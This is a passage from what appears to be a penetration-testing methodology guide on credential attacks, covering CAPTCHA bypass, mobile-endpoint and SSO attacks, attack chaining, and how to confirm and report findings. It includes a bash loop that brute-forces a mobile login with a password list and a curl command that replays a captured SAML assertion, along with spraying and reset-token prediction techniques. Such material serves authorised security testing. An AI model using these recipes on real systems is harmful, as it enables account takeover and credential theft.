**Confirmation signal.** A login attempt with a CAPTCHA-bypass primitive succeeds — the server does not reject with "invalid captcha" and processes the credential check. For token-reuse, the same token is accepted across multiple requests. For solver, the submitted token is accepted. For alternate-flow, the alternate endpoint accepts credentials without a CAPTCHA field.

**Impact.** Defeats the primary anti-automation defense; combined with the enumeration + lockout-break primitives, enables full-scale spray and brute. Routes to the base's rate-limit-bypass section for the post-CAPTCHA throttling and to `header_injection.md` for header-trust defense flaws that interact with CAPTCHA state.

## Mobile and SSO Flow Attacks

**Primitive.** Mobile app auth endpoints frequently differ from the web endpoints in rate limiting, CAPTCHA, and MFA behavior — the mobile endpoint is often the weakest surface. SSO flow attacks exploit the trust boundary between IdP and SP: SAMLResponse replay (the same assertion accepted twice), OIDC code injection (an attacker-controlled code presented in the attacker's own session that mints a victim's token), and cross-tenant assertion acceptance.

**Preconditions (mobile).** All of: (i) the mobile app's login endpoint is HTTPS-reachable (not just via the app itself); (ii) the endpoint lacks or weakly enforces rate limiting, CAPTCHA, or MFA that the web endpoint enforces; (iii) the endpoint's expected headers (User-Agent, X-Device-ID) are forge-able. **Preconditions (SAML replay).** All of: (i) the SP does not track SAML assertion IDs for replay prevention; (ii) the assertion is not time-restricted (NotOnOrAfter is far-future or missing); (iii) the attacker can capture an assertion. **Preconditions (OIDC code injection).** All of: (i) the client is a public client without PKCE; (ii) the attacker can trick the victim into completing authorization against an attacker-controlled client; (iii) the resulting code is exchangeable for the victim's token.

**Attack recipes.**

```bash
# Mobile-endpoint brute (no CAPTCHA/MFA on mobile):
for pw in $(cat passwords.txt); do
  curl -s -X POST 'https://api.target.com/mobile/auth/v1/login' \
    -H 'User-Agent: TargetApp/1.0 (iOS)' \
    -H 'X-Device-ID: a' \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"victim\",\"password\":\"$pw\"}"
done

# SAML replay — capture an assertion and re-submit:
# 1. Victim authenticates via SAML; attacker captures the SAMLResponse via logging proxy or MITM.
# 2. Attacker submits the same SAMLResponse to the SP's ACS URL from a fresh browser:
curl -X POST 'https://sp.target.com/saml/acs' \
  -d "SAMLResponse=$(cat captured.b64)" \
  -d "RelayState=/dashboard"
# If the SP does not track assertion IDs, the second submission succeeds.
```

**Confirmation signal (mobile).** The mobile endpoint accepts credentials and returns a token at a rate that would be blocked on the web. **(SAML replay).** The second submission of the same assertion establishes an authenticated session. **(OIDC code injection).** The attacker's session, after presenting the injected code, authenticates as the victim.

**Impact.** Full ATO via the alternate surface; cross-tenant token issuance via SSO replay. Routes to `authentication_jwt.md § SSO Protocols` for the SAML/OIDC-specific analysis and to `csrf.md § SSO ACS` for the forced-login variant.

## Chaining Surface

**Upstream primitives:** `reconnaissance/*` enumerates the auth endpoints (web, mobile, API, SSO, OAuth, ROPC); `information_disclosure.md § SSR Hydration` leaks hashed credentials or JWT secrets from the hydration blob; `broken_function_level_authorization.md` grants access to admin-reachable auth-management endpoints.

**Downstream capabilities:**

- `authentication_jwt.md` — recovered passwords, JWT secrets, and session tokens flow into token-manipulation primitives.
- `idor.md` — predicted reset tokens convert enumeration into ATO against enumerated users.
- `csrf.md` — session fixation and SSO ACS primitives are CSRF-chained; CORS reflection + credentials opens cross-origin credentialed access.
- `header_injection.md` — host-header reset poisoning routes through header-injection trust-boundary analysis.
- `cloud/*` — IdP spray against Entra/Okta/Google Workspace reaches cloud-plane IAM; one credential often grants broad cloud access.
- `active_directory` (if present) — SMB/Kerberos spray against on-prem AD.
- `race_conditions.md` — concurrency breaks on lockout counters and OTP validation.

**Composite chains (routed by filename):**

1. **Dedicated IdP enum endpoint → spray → cloud ATO.** M365 `GetCredentialType` or Okta `/api/v1/users` enumerates valid users; one sprayed password (`Autumn2026!`) breaks a lockout-weak account; the resulting token grants cloud IAM access. Routes to `cloud/*`.

2. **Timing enum → predictable reset token → full ATO.** Timing oracle enumerates valid users; token-entropy analysis predicts the reset token; self-triggered reset-for-victim + predicted-token submission resets victim's password. Routes to `authentication_jwt.md`.

3. **Pre-5.0.0 bcrypt + concatenation bug → long-left-field pushes password past 72-byte boundary → auth bypass.** The app concatenates `username+password` before bcrypt; a username longer than ~70 bytes pushes the password out of the hashed window; the authentication succeeds for any password. Routes to `weak_password_detection_novel_deep.md § bcrypt Pre-5.0.0 Silent Truncation`.

4. **Okta Classic unknown-UA bypass → per-app policy skipped → ATO against survivors.** Password-spray survivor + Python User-Agent bypasses per-app network/device/MFA policies. Routes to `weak_password_detection_novel_deep.md § Okta Classic App-Sign-On-Policy Bypass`.

5. **GraphQL batch mutation + CAPTCHA token reuse → 100 attempts per request → scale brute to credential-stuffing-rate.** One request runs 100 attempts; reused CAPTCHA token bypasses anti-automation; per-request rate limit stays at one. Routes to the base's credential-stuffing + CAPTCHA sections.

## Detection and Confirmation Methodology

- **Oracle calibration first.** Before any brute, calibrate the enumeration oracle statistically against a baseline. The dimension with the strongest separation is the one to key the attack on.
- **Lockout-key identification before break.** Observe which feature triggers the lockout (per-IP, per-account, per-string). The break primitive depends on which feature keys.
- **Per-surface rate-limit testing.** Mobile, API, OAuth ROPC, GraphQL, SSO endpoints — each has its own rate limit. Test every surface, not just the primary web login.
- **Token-reuse testing for CAPTCHA.** A CAPTCHA token that is accepted twice in a row is a reuse primitive, independent of the solver primitive.
- **Entropy sampling for reset tokens.** Collect 10-20 tokens; apply statistical analysis before concluding the token is strong.
- **CPU-DoS probe before severity assessment.** A long-password probe reveals whether the backend hashes before length-checking; a positive result is a separate finding independent of the brute-force findings.

## False-Positive Discipline

- **Lockout triggering is not security.** A lockout that triggers on 5 wrong attempts but keys on IP + is bypassable with X-Forwarded-For is a false-positive-of-mitigation; the real finding is the key.
- **CAPTCHA presence is not security.** A CAPTCHA that is server-side-generated with a reusable token is a false-positive-of-mitigation; the real finding is the token's binding.
- **Enumeration oracle without a brute surface is informational.** Enumerating a user list is a reconnaissance step; the finding is the follow-on brute. Report both or report the brute, not just the enumeration.
- **MFA presence is not security if MFA is bypassable.** A deployment with MFA + a direct MFA-skip primitive is a bypass finding, not an MFA-fail-closed finding.
- **Mobile endpoint rate-limit asymmetry is a real finding.** The deployment likely intended the mobile endpoint to match the web endpoint but did not; report the asymmetry.
- **The Okta Classic bypass has no CVE assigned.** Cite Okta's trust advisory as the authoritative source; do not fabricate a CVE ID. The primitive is real, the citation is vendor-advisory.
- **The bcrypt 72-byte truncation primitive requires pre-5.0.0 pyca/bcrypt to be silent.** On 5.0.0+ the library raises `ValueError`, which the application catches or crashes on. See `weak_password_detection_novel_deep.md` for the measured boundary.

## Validation

- Preserve the full brute transcript (request + response per attempt) plus the specific successful credential-and-response pair.
- Record the deployed server's version evidence where observable — a specific framework or library version anchors the "deployment-pin" conclusions.
- For CPU-DoS findings, capture the server's latency distribution before and during the attack; the delta is the finding evidence.
- For reset-token entropy findings, preserve the token sample, the entropy-analysis output, and the specific predicted-token-accepted response.
- For CAPTCHA bypass findings, capture the request+response for the reused-token case or the alternate-flow case; the bypass is reproducible from the captured transaction.

## Summary

Advanced credential-attack primitives operate at the layer below the brute: oracle calibration, lockout-key identification and break, OAuth/GraphQL/mobile alternate-surface discovery, OTP/reset-token weakness analysis, password-field compute-sink DoS, and hash-recovery with modern cracking workflows. Each is a reproducible primitive with its own preconditions, detection signal, and confirmation. The CVE-level and vendor-advisory findings (bcrypt pre-5.0.0 silent truncation; Okta Classic app-sign-on bypass) live in the novel sibling; this file carries the technique-class treatments that generalize across stacks. Chain routing by filename sends mechanism detail to `authentication_jwt.md`, `csrf.md`, `header_injection.md`, `cloud/*`, and `race_conditions.md` as the specific chain requires.
